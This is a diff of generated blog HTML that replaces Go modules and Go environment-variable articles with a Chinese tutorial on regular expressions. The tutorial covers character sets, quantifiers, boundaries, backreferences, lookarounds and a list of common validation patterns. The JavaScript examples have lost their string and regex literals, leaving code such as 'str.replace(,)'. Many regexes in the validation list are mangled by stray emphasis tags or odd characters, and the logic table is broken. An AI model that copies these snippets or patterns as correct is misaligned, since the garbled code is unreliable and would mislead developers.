+<h2 id="多个字符"><a href="#多个字符" class="headerlink" title="多个字符"></a>多个字符</h2><p>单个字符的映射关系是一对一的，即正则表达式的被用来筛选匹配的字符只有一个。而这显然是不够的，只要引入集合区间和通配符的方式就可以实现一对多的匹配了。<br>在正则表达式里，集合的定义方式是使用中括号<code>[</code>和<code>]</code>。如<code>/[123]/</code>这个正则就能同时匹配 1,2,3 三个字符。那如果我想匹配所有的数字怎么办呢？从 0 写到 9 显然太过低效，所以元字符<code>-</code>就可以用来表示区间范围，利用<code>/[0-9]/</code>就能匹配所有的数字, <code>/[a-z]/</code>则可以匹配所有的英文小写字母。<br>即便有了集合和区间的定义方式，如果要同时匹配多个字符也还是要一一列举，这是低效的。所以在正则表达式里衍生了一批用来同时匹配多个字符的简便正则表达式:</p>
 <table>
 <thead>
 <tr>
-<th><strong>tag</strong></th>
-<th><strong>模块导入路径</strong></th>
-<th><strong>含义</strong></th>
+<th>匹配区间</th>
+<th>正则表达式</th>
+<th>记忆方式</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>v0.0.1</td>
-<td>github.com/eddycjy/mquote</td>
-<td>mquote  项目的 v0.0.1 版本</td>
+<td>除了换行符之外的任何字符</td>
+<td>.</td>
+<td>句号,除了句子结束符</td>
 </tr>
 <tr>
-<td>module/tour/v0.0.1</td>
-<td>github.com/eddycjy/mquote/module/tour</td>
-<td>mquote  项目下子模块 module/tour  的 v0.0.1  版本</td>
+<td>单个数字, [0-9]</td>
+<td>\d</td>
+<td><strong>d</strong>igit</td>
+</tr>
+<tr>
+<td>除了[0-9]</td>
+<td>\D</td>
+<td><strong>not</strong> <strong>d</strong>igit</td>
+</tr>
+<tr>
+<td>包括下划线在内的单个字符，[A-Za-z0-9_]</td>
+<td>\w</td>
+<td><strong>w</strong>ord</td>
+</tr>
+<tr>
+<td>非单字字符</td>
+<td>\W</td>
+<td><strong>not</strong> <strong>w</strong>ord</td>
+</tr>
+<tr>
+<td>匹配空白字符,包括空格、制表符、换页符和换行符</td>
+<td>\s</td>
+<td><strong>s</strong>pace</td>
+</tr>
+<tr>
+<td>匹配非空白字符</td>
+<td>\S</td>
+<td><strong>not</strong> <strong>s</strong>pace</td>
 </tr>
 </tbody></table>
-<p><a href="">
-</a></p>
-<p><a href="">
-</a></p>
-<h4 id="导入主模块和子模块"><a href="#导入主模块和子模块" class="headerlink" title="导入主模块和子模块"></a>导入主模块和子模块</h4><p>结合上述内容，拉取主模块的话，还是照旧执行如下命令</p>
-<p>go: finding github.com/eddycjy/mquote v0.0.1<br>go: downloading github.com/eddycjy/mquote v0.0.1<br>go: extracting github.com/eddycjy/mquote v0.0.1</p>
-<p>如果是想拉取子模块，执行</p>
-<p>go: finding github.com/eddycjy/mquote/module v0.0.1<br>go: finding github.com/eddycjy/mquote/module/tour v0.0.1<br>go: downloading github.com/eddycjy/mquote/module/tour v0.0.1<br>go: extracting github.com/eddycjy/mquote/module/tour v0.0.1<br><a href="">
-</a></p>
-<p>我们将主模块和子模块的拉取进行对比，你会发现子模块的拉取会多出一步，它会发现 github.com/eddycjy/mquote/module，再继续推算，最终拉取到 module/tour</p>
-<h2 id="go-mod-的导入路径"><a href="#go-mod-的导入路径" class="headerlink" title="go mod 的导入路径"></a>go mod 的导入路径</h2><h3 id="不同版本的导入路径"><a href="#不同版本的导入路径" class="headerlink" title="不同版本的导入路径"></a>不同版本的导入路径</h3><p>在前面的模块拉取和引用中，你会发现我们的模块导入路径就是 github.com/eddycjy/mquote 和 github.com/eddycjy/mquote/module/tour ，似乎并没有什么特殊的。</p>
-<p>其实不然，实际上 go modules 在主版本号为 v0 和 v1 的情况下省略了版本号，而在主版本号为 v2 及以上刚需要明确指定出主版本号，否则会出现冲突，其 tag 与模块导入路径的大致对应关系如下：</p>
+<h1 id="循环与重复"><a href="#循环与重复" class="headerlink" title="循环与重复"></a>循环与重复</h1><p>一对一和一对多的字符匹配都讲完了。接下来，就该介绍如何同时匹配多个字符。要实现多个字符的匹配我们只要多次循环，重复使用我们的之前的正则规则就可以了。那么根据循环次数的多与少，我们可以分为 0 次，1 次，多次，特定次。</p>
+<h2 id="0-1"><a href="#0-1" class="headerlink" title="0 | 1"></a>0 | 1</h2><p>元字符<code>?</code>代表了匹配一个字符或 0 个字符。设想一下，如果你要匹配<code>color</code>和<code>colour</code>这两个单词，就需要同时保证<code>u</code>这个字符是否出现都能被匹配到。所以你的正则表达式应该是这样的：<code>/colou?r/</code>。</p>
+<h2 id="gt-0"><a href="#gt-0" class="headerlink" title="&gt;= 0"></a>&gt;= 0</h2><p>元字符<code>*</code>用来表示匹配 0 个字符或无数个字符。通常用来过滤某些可有可无的字符串。</p>
+<h2 id="gt-1"><a href="#gt-1" class="headerlink" title="&gt;= 1"></a>&gt;= 1</h2><p>元字符<code>+</code>适用于要匹配同个字符出现 1 次或多次的情况。</p>
+<h2 id="特定次数"><a href="#特定次数" class="headerlink" title="特定次数"></a>特定次数</h2><p>在某些情况下，我们需要匹配特定的重复次数，元字符<code>&#123;</code>和<code>&#125;</code>用来给重复匹配设置精确的区间范围。如’a’我想匹配 3 次,那么我就使用<code>/a&#123;3&#125;/</code>这个正则，或者说’a’我想匹配至少两次就是用<code>/a&#123;2,&#125;/</code>这个正则。<br>以下是完整的语法：<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- &#123;x&#125;: x次</span><br><span class="line"></span><br><span class="line">- &#123;min, max&#125;： 介于min次到max次之间</span><br><span class="line"></span><br><span class="line">- &#123;min, &#125;: 至少min次</span><br><span class="line"></span><br><span class="line">- &#123;0, max&#125;： 至多max次</span><br></pre></td></tr></table></figure>
+
+<p>由于这些元字符比较抽象，且容易混淆，所以我用了联想记忆的方式编了口诀能保证在用到的时候就能回忆起来。</p>
 <table>
 <thead>
 <tr>
-<th>tag</th>
-<th>模块导入路径</th>
+<th>匹配规则</th>
+<th>元字符</th>
+<th>联想方式</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>v0.0.0</td>
-<td>github.com/eddycjy/mquote</td>
+<td>0 次或 1 次</td>
+<td>?</td>
+<td>且<strong>问</strong>,此事<strong>有</strong>还<strong>无</strong></td>
 </tr>
 <tr>
-<td>v1.0.0</td>
-<td>github.com/eddycjy/mquote</td>
+<td>0 次或无数次</td>
+<td>*</td>
+<td>宇宙洪荒,<strong>辰宿</strong>列张：宇宙伊始，从无到有，最后星宿布满星空</td>
 </tr>
 <tr>
-<td>v2.0.0</td>
-<td>github.com/eddycjy/mquote/v2</td>
+<td>1 次或无数次</td>
+<td>+</td>
+<td><strong>一加</strong>, +1</td>
 </tr>
 <tr>
-<td>v3.0.0</td>
-<td>github.com/eddycjy/mquote/v3</td>
+<td>特定次数</td>
+<td>{x}, {min, max}</td>
+<td>可以想象成一个数轴，从一个点，到一个射线再到线段。min 和 max 分别表示了左闭右闭区间的左界和右界</td>
 </tr>
 </tbody></table>
-<p><a href="">
-</a><br>简单来讲，就是主版本号为 v0 和 v1，不需要在模块导入路径包含主版本信息，而在 v1 版本以后，也就是 v2 起，必须在模块的导入路径末尾加上主版本号，引用时就需要调整为如下格式</p>
-<p><a href="">      </a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">    &quot;github.com&#x2F;eddycjy&#x2F;mquote&#x2F;v2&#x2F;example&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="位置边界"><a href="#位置边界" class="headerlink" title="位置边界"></a>位置边界</h1><p>上面我们把字符的匹配都介绍完了，接着我们还需要位置边界的匹配。在长文本字符串查找过程中，我们常常需要限制查询的位置。比如我只想在单词的开头结尾查找。</p>
+<h2 id="单词边界"><a href="#单词边界" class="headerlink" title="单词边界"></a>单词边界</h2><p>单词是构成句子和文章的基本单位，一个常见的使用场景是把文章或句子中的特定单词找出来。如：<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The cat scattered his food all over the room.</span><br></pre></td></tr></table></figure>
 
-<p><a href="">
-</a></p>
-<p>另外忽略主版本号 v0 和 v1 是强制性的（不是可选项），因此每个软件包只有一个明确且规范的导入路径。</p>
-<h3 id="为什么忽略-v0、v1"><a href="#为什么忽略-v0、v1" class="headerlink" title="为什么忽略 v0、v1"></a>为什么忽略 v0、v1</h3><ol>
-<li>导入路径中忽略 v1 的原因是：考虑到许多开发人员创建一旦到达 v1 版本便永不改变的软件包，这是官方所鼓励的，不认为所有这些开发人员在无意发布 v2 版本时都应被迫拥有明确的 v1 版本尾缀，<strong>这将导致 v1 版本变成“噪音”且无意义。</strong></li>
-<li>导入路径中忽略了 v0 版本的原因是： 根据语义化版本规范，v0 的这些版本完全没有兼容性保证。需要<strong>一个显式的 v0 版本的标识对确保兼容性没有多大帮助。</strong></li>
-</ol>
-<h2 id="go-modules-语义化版本控制"><a href="#go-modules-语义化版本控制" class="headerlink" title="go modules 语义化版本控制"></a>go modules 语义化版本控制</h2><p>我们不断地在 go modules 的使用中提到版本号，其实质上被称为“语义化版本”，假设我们的版本号 v1.2.3，如下</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861346684-ab7daa23-0890-4a55-82ed-48ff42ec56ed.png#align=left&display=inline&height=598&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.29.01.png&originHeight=598&originWidth=1216&size=97845&status=done&style=none&width=1216" alt="截屏2021-01-17 下午1.29.01.png"></p>
-<p>其版本格式为 <strong>主版本号.次版本号.修订号</strong>， 版本号的递增规则如下</p>
-<ol>
-<li>主版本号：当你做了不兼容的 API 修改</li>
-<li>次版本号： 当你做了向下兼容的功能性新增</li>
-<li>修订号：当你做了向下兼容的问题修正。</li>
-</ol>
-<p>假设你是先行版本号或者特殊情况，可以将版本追加到“主版本.次版本号.修订号”的后面，作为延伸</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861427051-ba13e616-eaab-4b7a-b356-a4c77f92e3ea.png#align=left&display=inline&height=502&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.30.19.png&originHeight=502&originWidth=1286&size=104448&status=done&style=none&width=1286" alt="截屏2021-01-17 下午1.30.19.png"></p>
-<p>至此我们介绍了 go modules 所支持的两类版本号方式，在我们发布新版本打 tag 时，需要注意遵循，否则不遵循语义化版本规则的版本号都是无法进行拉取的。</p>
-<h3 id="go-moduels-的最小版本选择"><a href="#go-moduels-的最小版本选择" class="headerlink" title="go moduels 的最小版本选择"></a>go moduels 的最小版本选择</h3><p>现在我们已经有一个模块，也有发布的 tag，但是一个模块往往依赖着许多其他的模块，并且不同的模块在依赖时很有可能会出现依赖同一个模块的不同版本，如下</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861456233-18052bae-5a2f-4484-b45b-0bb87273d4b8.png#align=left&display=inline&height=684&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.30.52.png&originHeight=684&originWidth=1072&size=252115&status=done&style=none&width=1072" alt="截屏2021-01-17 下午1.30.52.png"></p>
+<p>我想找到<code>cat</code>这个单词，但是如果只是使用<code>/cat/</code>这个正则，就会同时匹配到<code>cat</code>和<code>scattered</code>这两处文本。这时候我们就需要使用边界正则表达式<code>\b</code>，其中 b 是 boundary 的首字母。在正则引擎里它其实匹配的是能构成单词的字符(\w)和不能构成单词的字符(\W)中间的那个位置。<br>上面的例子改写成<code>/\bcat\b/</code>这样就能匹配到<code>cat</code>这个单词了。</p>
+<h2 id="字符串边界"><a href="#字符串边界" class="headerlink" title="字符串边界"></a>字符串边界</h2><p>匹配完单词，我们再来看一下一整个字符串的边界怎么匹配。元字符<code>^</code>用来匹配字符串的开头。而元字符<code>$</code>用来匹配字符串的末尾。注意的是在长文本里，如果要排除换行符的干扰，我们要使用多行模式。试着匹配<code>I am scq000</code>这个句子：<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I am scq000.</span><br><span class="line">I am scq000.</span><br><span class="line">I am scq000.</span><br></pre></td></tr></table></figure>
 
-      
+<p>我们可以使用<code>/^I am scq000\.$/m</code>这样的正则表达式，其实 m 是 multiple line 的首字母。正则里面的模式除了 m 外比较常用的还有 i 和 g。前者的意思是忽略大小写，后者的意思是找到所有符合的匹配。<br>最后，总结一下：</p>
+<table>
+<thead>
+<tr>
+<th>边界和标志</th>
+<th>正则表达式</th>
+<th>记忆方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单词边界</td>
+<td>\b</td>
+<td><strong>b</strong>oundary</td>
+</tr>
+<tr>
+<td>非单词边界</td>
+<td>\B</td>
+<td><strong>not</strong> <strong>b</strong>oundary</td>
+</tr>
+<tr>
+<td>字符串开头</td>
+<td>^</td>
+<td>小<strong>头尖尖</strong>那么大个</td>
+</tr>
+<tr>
+<td>字符串结尾</td>
+<td>$</td>
+<td><strong>终结</strong>者，美国科幻电影，美元符$</td>
+</tr>
+<tr>
+<td>多行模式</td>
+<td>m 标志</td>
+<td><strong>m</strong>ultiple of lines</td>
+</tr>
+<tr>
+<td>忽略大小写</td>
+<td>i 标志</td>
+<td><strong>i</strong>gnore case, case-<strong>i</strong>nsensitive</td>
+</tr>
+<tr>
+<td>全局模式</td>
+<td>g 标志</td>
+<td><strong>g</strong>lobal</td>
+</tr>
+</tbody></table>
+<h1 id="子表达式"><a href="#子表达式" class="headerlink" title="子表达式"></a>子表达式</h1><p>字符匹配我们介绍的差不多了，更加高级的用法就得用到子表达式了。通过嵌套递归和自身引用可以让正则发挥更强大的功能。<br>从简单到复杂的正则表达式演变通常要采用<strong>分组、回溯引用和逻辑处理</strong>的思想。利用这三种规则，可以推演出无限复杂的正则表达式。</p>
+<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p>其中分组体现在：所有以<code>(</code>和<code>)</code>元字符所包含的正则表达式被分为一组，每一个分组都是一个<strong>子表达式</strong>，它也是构成高级正则表达式的基础。如果只是使用简单的<code>(regex)</code>匹配语法本质上和不分组是一样的，如果要发挥它强大的作用，往往要结合回溯引用的方式。</p>
+<h2 id="回溯引用"><a href="#回溯引用" class="headerlink" title="回溯引用"></a>回溯引用</h2><p>所谓回溯引用（backreference）指的是模式的后面部分引用前面已经匹配到的子字符串。你可以把它想象成是变量，回溯引用的语法像<code>\1</code>,<code>\2</code>,….,其中<code>\1</code>表示引用的第一个子表达式，<code>\2</code>表示引用的第二个子表达式，以此类推。而<code>\0</code>则表示整个表达式。<br>假设现在要在下面这个文本里匹配两个连续相同的单词，你要怎么做呢？<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello what what is the first thing, and I am am scq000.</span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
+<p>利用回溯引用，我们可以很容易地写出<code>\b(\w+)\s\1</code>这样的正则。<br>回溯引用在替换字符串中十分常用，语法上有些许区别，用<code>$1</code>,<code>$2</code>…来引用要被替换的字符串。下面以 js 代码作演示：<br>var’abc abc 123’/(ab)c/g’$1g’// 得到结果 ‘abg abg 123’复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> str &#x3D; ;</span><br><span class="line">str.replace(,);</span><br></pre></td></tr></table></figure>
 
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/">展开全文 >></a>
-        </p>
-      
+<p>如果我们不想子表达式被引用，可以使用<strong>非捕获</strong>正则<code>(?:regex)</code>这样就可以避免浪费内存。<br>var’scq000’/(scq00)(?:0)/‘$1,$2’// 返回 scq00,$2// 由于使用了非捕获正则，所以第二个引用没有值，这里直接替换为$2 复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> str &#x3D; .</span><br><span class="line">str.replace(, )</span><br></pre></td></tr></table></figure>
 
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
+<p>有时，我们需要限制回溯引用的适用范围。那么通过前向查找和后向查找就可以达到这个目的。</p>
+<h3 id="前向查找"><a href="#前向查找" class="headerlink" title="前向查找"></a>前向查找</h3><p>前向查找(lookahead)是用来限制后缀的。凡是以<code>(?=regex)</code>包含的子表达式在匹配过程中都会用来限制前面的表达式的匹配。例如<code>happy happily</code>这两个单词，我想获得以<code>happ</code>开头的副词，那么就可以使用<code>happ(?=ily)</code>来匹配。如果我想过滤所有以<code>happ</code>开头的副词，那么也可以采用<strong>负前向查找</strong>的正则<code>happ(?!ily)</code>，就会匹配到<code>happy</code>单词的<code>happ</code>前缀。</p>
+<h3 id="后向查找"><a href="#后向查找" class="headerlink" title="后向查找"></a>后向查找</h3><p>介绍完前向查找，接着我们再来介绍一下它的反向操作：后向查找(lookbehind)。后向查找(lookbehind)是通过指定一个子表达式，然后从符合这个子表达式的位置出发开始查找符合规则的字串。举个简单的例子： <code>apple</code>和<code>people</code>都包含<code>ple</code>这个后缀，那么如果我只想找到<code>apple</code>的<code>ple</code>，该怎么做呢？我们可以通过限制<code>app</code>这个前缀，就能唯一确定<code>ple</code>这个单词了。<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;(?&lt;&#x3D;app)ple&#x2F;</span><br></pre></td></tr></table></figure>
 
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
+<p>其中<code>(?&lt;=regex)</code>的语法就是我们这里要介绍的后向查找。<code>regex</code>指代的子表达式会作为限制项进行匹配，匹配到这个子表达式后，就会继续向<strong>后</strong>查找。另外一种限制匹配是利用<code>(?&lt;!regex)</code> 语法，这里称为<strong>负后向查找</strong>。与正前向查找不同的是，被指定的子表达式不能被匹配到。于是，在上面的例子中，如果想要查找<code>apple</code>的<code>ple</code>也可以这么写成<code>/(?&lt;!peo)ple</code>。<br>需要注意的，不是每种正则实现都支持后向查找。在 javascript 中是不支持的，所以如果有用到后向查找的情况，有一个思路是将字符串进行翻转，然后再使用前向查找，作完处理后再翻转回来。看一个简单的例子：<br>// 比如我想替换 apple 的 ple 为 plyvar’apple people’’’’’/elp(?=pa)/‘ylp’’’’’复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> str &#x3D; ;</span><br><span class="line">str.split().reverse().join().replace(, ).split().reverse().join();</span><br></pre></td></tr></table></figure>
 
-
-
-
-  
-    <article id="post-yuque/Go 环境变量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/15/yuque/Go%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/">Go 环境变量</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/15/yuque/Go%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" class="archive-article-date">
-  	<time datetime="2021-01-15T16:00:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Go 开发环境依赖于一些操作系统环境变量，你最好在安装 Go 之间就已经设置好他们。如果你使用的是 Windows 的话，你完全不用进行手动设置，Go 将被默认安装在目录 <code>c:/go</code> 下。这里列举几个最为重要的环境变量：</p>
-<ul>
-<li><strong>$GOROOT</strong> 表示 Go 在你的电脑上的安装位置，它的值一般都是 <code>$HOME/go</code>，当然，你也可以安装在别的地方。</li>
-<li><strong>$GOARCH</strong> 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。</li>
-<li><strong>$GOOS</strong> 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。</li>
-<li><strong>$GOBIN</strong> 表示编译器和链接器的安装位置，默认是 <code>$GOROOT/bin</code>，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。</li>
+<blockquote>
+<p>ps: 感谢评论区提醒，从 es2018 之后，chrome 中的正则表达式也支持反向查找了。不过，在实际项目中还需要注意对旧浏览器的支持，以防线上出现 Bug。详情请查看<a target="_blank" rel="noopener" href="http://kangax.github.io/compat-table/es2016plus/#test-RegExp_Lookbehind_Assertions">http://kangax.github.io/compat-table/es2016plus/#test-RegExp_Lookbehind_Assertions</a></p>
+</blockquote>
+<p>最后回顾一下这部分内容：</p>
+<table>
+<thead>
+<tr>
+<th>回溯查找</th>
+<th>正则</th>
+<th>记忆方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>引用</td>
+<td>\0,\1,\2 和 $0, $1, $2</td>
+<td>转义+数字</td>
+</tr>
+<tr>
+<td>非捕获组</td>
+<td>(?:)</td>
+<td>引用表达式(()), 本身不被消费(?),引用(:)</td>
+</tr>
+<tr>
+<td>前向查找</td>
+<td>(?=)</td>
+<td>引用子表达式(())，本身不被消费(?), 正向的查找(=)</td>
+</tr>
+<tr>
+<td>前向负查找</td>
+<td>(?!)</td>
+<td>引用子表达式(())，本身不被消费(?), 负向的查找(!)</td>
+</tr>
+<tr>
+<td>后向查找</td>
+<td>(?&lt;=)</td>
+<td>引用子表达式(())，本身不被消费(?), 后向的(&lt;，开口往后)，正的查找(=)</td>
+</tr>
+<tr>
+<td>后向负查找</td>
+<td>(?&lt;!)</td>
+<td>引用子表达式(())，本身不被消费(?), 后向的(&lt;，开口往后)，负的查找(!)</td>
+</tr>
+</tbody></table>
+<h2 id="逻辑处理"><a href="#逻辑处理" class="headerlink" title="逻辑处理"></a>逻辑处理</h2><p>计算机科学就是一门包含逻辑的科学。让我们回忆一下编程语言当中用到的三种逻辑关系，与或非。<br>在正则里面，默认的正则规则都是<strong>与</strong>的关系所以这里不讨论。<br>而<strong>非</strong>关系，分为两种情况：一种是字符匹配，另一种是子表达式匹配。在字符匹配的时候，需要使用<code>^</code>这个元字符。在这里要着重记忆一下：<strong>只有在</strong><code>**[**</code><strong>和</strong><code>**]**</code><strong>内部使用的</strong><code>**^**</code><strong>才表示非的关系</strong>。子表达式匹配的非关系就要用到前面介绍的前向负查找子表达式<code>(?!regex)</code>或后向负查找子表达式<code>(?&lt;!regex)</code>。<br>或关系，通常给子表达式进行归类使用。比如，我同时匹配 a,b 两种情况就可以使用<code>(a|b)</code>这样的子表达式。</p>
+<p>| 逻辑关系 | 正则元字符  |<br>| ——– | ———– | — |<br>| 与       | 无          |<br>| 非       | [^regex]和! |<br>| 或       |             |     |</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于正则来说，符号之抽象往往让很多程序员却步。针对不好记忆的特点，我通过分类和联想的方式努力让其变得有意义。我们先从一对一的单字符，再到多对多的子字符串介绍，然后通过分组、回溯引用和逻辑处理的方式来构建高级的正则表达式。<br>在最后，出个常用的正则面试题吧：请写出一个正则来处理数字千分位，如<code>12345</code>替换为<code>12,345</code>。请尝试自己推理演绎得出答案，而不是依靠搜索引擎:)。</p>
+<h1 id="常用表达式"><a href="#常用表达式" class="headerlink" title="常用表达式"></a>常用表达式</h1><h2 id="一、校验数字的表达式"><a href="#一、校验数字的表达式" class="headerlink" title="一、校验数字的表达式"></a>一、校验数字的表达式</h2><ul>
+<li>数字：<strong>^[0-9]*$</strong></li>
+<li>n 位的数字：<strong>^\d{n}$</strong></li>
+<li>至少 n 位的数字<strong>：^\d{n,}$</strong></li>
+<li>m-n 位的数字：<strong>^\d{m,n}$</strong></li>
+<li>零和非零开头的数字：<strong>^(0|[1-9][0-9]*)$</strong></li>
+<li>非零开头的最多带两位小数的数字：<strong>^([1-9][0-9]*)+(.[0-9]{1,2})?$</strong></li>
+<li>带 1-2 位小数的正数或负数：<strong>^(-)?\d+(.\d{1,2})$</strong></li>
+<li>正数、负数、和小数：<strong>^(-|+)?\d+(.\d+)?$</strong></li>
+<li>有两位小数的正实数：<strong>^[0-9]+(.[0-9]{2})?$</strong></li>
+<li>有 1~3 位小数的正实数：<strong>^[0-9]+(.[0-9]{1,3})?$</strong></li>
+<li>非零的正整数：<strong>^[1-9]\d*$ 或 ^([1-9][0-9]<em>){1,3}$ 或 ^+?[1-9][0-9]\</em>$</strong></li>
+<li>非零的负整数：<strong>^-[1-9][]0-9”<em>$ 或 ^-[1-9]\d</em>$</strong></li>
+<li>非负整数：<strong>^\d+$ 或 ^[1-9]\d*|0$</strong></li>
+<li>非正整数：<strong>^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$</strong></li>
+<li>非负浮点数：<strong>^\d+(.\d+)?$ 或 ^[1-9]\d<em>.\d</em>|0.\d*[1-9]\d*|0?.0+|0$</strong></li>
+<li>非正浮点数：<strong>^((-\d+(.\d+)?)|(0+(.0+)?))$ 或 ^(-([1-9]\d<em>.\d</em>|0.\d*[1-9]\d*))|0?.0+|0$</strong></li>
+<li>正浮点数：<strong>^[1-9]\d<em>.\d</em>|0.\d*[1-9]\d*$ 或 ^(([0-9]+.[0-9]<em>[1-9][0-9]</em>)|([0-9]<em>[1-9][0-9]<em>.[0-9]+)|([0-9]</em>[1-9][0-9]</em>))$</strong></li>
+<li>负浮点数：<strong>^-([1-9]\d<em>.\d</em>|0.\d*[1-9]\d*)$ 或 ^(-(([0-9]+.[0-9]<em>[1-9][0-9]</em>)|([0-9]<em>[1-9][0-9]<em>.[0-9]+)|([0-9]</em>[1-9][0-9]</em>)))$</strong></li>
+<li>浮点数：<strong>^(-?\d+)(.\d+)?$ 或 ^-?([1-9]\d<em>.\d</em>|0.\d*[1-9]\d*|0?.0+|0)$</strong></li>
 </ul>
-<p>目标机器是指你打算运行你的 Go 应用程序的机器。<br>Go 编译器支持交叉编译，也就是说你可以在一台机器上构建运行在具有不同操作系统和处理器架构上运行的应用程序，也就是说编写源代码的机器可以和目标机器有完全不同的特性（操作系统与处理器架构）。<br>为了区分本地机器和目标机器，你可以使用 <code>$GOHOSTOS</code> 和 <code>$GOHOSTARCH</code> 设置本地机器的操作系统名称和编译体系结构，这两个变量只有在进行交叉编译的时候才会用到，如果你不进行显示设置，他们的值会和本地机器（<code>$GOOS</code> 和 <code>$GOARCH</code>）一样。</p>
-<ul>
-<li><strong>$GOPATH</strong> 默认采用和 <code>$GOROOT</code> 一样的值，但从 Go 1.1 版本开始，你必须修改为其它路径。它可以包含多个包含 Go 语言源码文件、包文件和可执行文件的路径，而这些路径下又必须分别包含三个规定的目录：<code>src</code>、<code>pkg</code> 和 <code>bin</code>，这三个目录分别用于存放源码文件、包文件和可执行文件。</li>
-<li><strong>$GOARM</strong> 专门针对基于 arm 架构的处理器，它的值可以是 5 或 6，默认为 6。</li>
-<li><strong>$GOMAXPROCS</strong> 用于设置应用程序可使用的处理器个数与核数，详见第 14.1.3 节。</li>
+<hr>
+<h2 id="校验字符的表达式"><a href="#校验字符的表达式" class="headerlink" title="校验字符的表达式"></a>校验字符的表达式</h2><ul>
+<li>汉字：<strong>^[\u4e00-\u9fa5]{0,}$</strong></li>
+<li>英文和数字：<strong>^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</strong></li>
+<li>长度为 3-20 的所有字符：<strong>^.{3,20}$</strong></li>
+<li>由 26 个英文字母组成的字符串：<strong>^[A-Za-z]+$</strong></li>
+<li>由 26 个大写英文字母组成的字符串：<strong>^[A-Z]+$</strong></li>
+<li>由 26 个小写英文字母组成的字符串：<strong>^[a-z]+$</strong></li>
+<li>由数字和 26 个英文字母组成的字符串：<strong>^[A-Za-z0-9]+$</strong></li>
+<li>由数字、26 个英文字母或者下划线组成的字符串：<strong>^\w+$ 或 ^\w{3,20}$</strong></li>
+<li>中文、英文、数字包括下划线：<strong>^[\u4E00-\u9FA5A-Za-z0-9_]+$</strong></li>
+<li>中文、英文、数字但不包括下划线等符号：<strong>^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</strong></li>
+<li>可以输入含有^%&amp;’,;=?$&quot;等字符：*<em>[^%&amp;’,;=?$\x22]+\</em>*</li>
+<li>禁止输入含有<del>的字符：**[^</del>\x22]+**</li>
 </ul>
